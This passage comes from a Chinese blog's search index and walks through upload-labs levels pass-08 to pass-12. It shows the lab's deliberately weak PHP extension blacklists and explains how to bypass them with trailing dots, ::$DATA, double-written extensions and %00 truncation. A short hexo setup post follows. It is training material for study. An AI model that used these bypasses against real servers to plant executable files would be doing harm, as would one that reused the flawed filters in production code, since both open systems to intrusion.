&#125;&#125;?&gt; 这题的黑名单也比较全，但没有删除文件名末尾的点思路是上传一个.php.的文件，但是windos不能文件最后加点，所以在抓包里面将.php改为.php. 这样就能上传成功。 pass-08 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 这题的黑名单也比较全，但是没有去除后面的::$DATA,也就是在burp中，改为1.php::$DATA,就能上传成功。 pass-09 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 这题的黑名单比较全，虽然把最后的点给删掉，但是仍然可以绕过，因为这里的过滤并没有递归下去，只是一步，这样就相当于SQL注入里面用str_replace只过滤一次关键字可以在burp里面改为1.php. .就能上传成功 pass-1012345678910111213141516171819202122232425&lt;?phpinclude '../config.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,"", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 拦截方式：$file_name = str_ireplace($deny_ext,””, $file_name);, 作用是把黑名单里面的后缀名替换成空, 由于只替换了一遍, 只对文件名进行了一次过滤，所以可以采用双写绕过。绕过方式：构造双重文件名,1.phphpp pass-11123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; $img_path直接拼接，因此可以利用%00截断绕过。先传一张图片，在抓包中改save_path值为../upload labs/1.php%00//某些情况下可以使用 %00 截断1、PHP 版本 &lt; 5.3.42、php.ini 中 magic_quotes_gpc=off pass-12123456789101112131415161718$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传失败"; &#125; &#125; else &#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125; 和上题类似，区别是这题是post，上题是get，%00 截断在 GET 中被 url 解码之后是空字符, 但是在 POST 中 %00 不会被 url 解码, 所以只能通过 burpsuite 修改 hex 值为 00 进行截断.在hex里面把2b改成00。 转载自： https://note.youdao.com/ynoteshare1/index.html?id=a2817a779ccb11d86544177a5b212cd2&amp;type=note 原作者：执子之手610]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>上传漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第一篇博文]]></title>
    <url>%2F2019%2F10%2F01%2F%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E6%96%87%2F</url>
    <content type="text"><![CDATA[今天是十月一日国庆节，祝祖国繁荣昌盛，更加富强！这是我的第一篇博文，从此这里将成为我记录知识，不断成长的一片小园地。documentation ，troubleshooting，GitHubhexo搭建博客的简单用法： 新建博文1$ hexo new "My New Post" More info: Writing 本地预览123$ hexo clean$ hexo g$ hexo s 部署博客123$ hexo clean$ hexo g$ hexo d]]></content>
      <categories>
        <category>记录</category>
      </categories>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
</search>
